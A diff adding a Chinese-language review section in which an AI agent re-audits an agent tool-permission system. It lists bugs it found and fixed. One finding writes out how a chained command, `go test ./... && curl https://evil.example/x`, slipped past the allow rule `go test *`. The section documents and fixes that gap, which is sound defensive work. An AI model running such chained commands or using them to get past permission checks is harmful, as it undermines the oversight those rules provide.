@@ -176,3 +176,27 @@ Product Owner 授权 A4 后，发现提交 `86460c1c` 已在授权前由子代�
 send_message（空载荷）、fresh spawn（线程上限）均失败；子代理线程被历次
 故障尝试占满。评审以 Controller 冷读 + 既有 v9 flash FAIL 基线 + RED
 逐项验证替代，fresh 独立复评继续列为开放项（环境/通道恢复后补做）。
+
+## 8. flash 冷读复评 v14（2026-08-05，Amendment 3）
+
+子代理通道在 v12/v13 仍空载荷，且线程上限阻止新建。按 Product Owner
+"继续用 flash 来评估"的指示，本 Agent 以 flash 身份对提交链
+`91d14f42^..HEAD` 做 cold 冷读复评（不沿用既有结论），发现并处置：
+
+- **P0 A7**：`bashPatternMatches` 整串前缀/glob 允许单段 allow 规则放行
+  链式命令（实测默认模板 `go test *` 放行 `go test ./... && curl
+  https://evil.example/x`），违反契约 §3.2 与 RED #6。修复为段数对齐
+  整串匹配；RED #20 先红后绿。
+- **P1 A8**：Swift `PermissionAttention` 缺 `approvals`，且
+  `PermissionDecisionView.approvalID` 非可选导致真实响应（omitempty 省略
+  approval_id）客户端解码失败。修复模型/视图/测试 + 真实 IPC 契约测试
+  `TestBp1SwiftProbeDecodesRealPermissionAttentionWithApprovals`。
+- **P1 A9**：`EffectiveMode` 同层多激活遍历 map 非确定；改为 scopeID
+  字典序最小者。
+- **P2 A10**：Denial.RuleIDs 排序输出。
+- **P2 A11**：activation/admin-lock 事件流不匹配 Replay 拒绝。
+- **P2 A12/A13**：decision→approval 直接关联、间接危险调用沙箱留待 B-W1。
+
+验证：Go build/vet/test 全 PASS（含 RED #20、Swift 真实 IPC 契约测试）；
+Swift 98 tests + 4 Swift Testing PASS；final13 verify 保持 PASS。
+复评结论：P0/P1 全部修复并验证；fresh 独立复评仍为开放项（通道恢复后补做）。
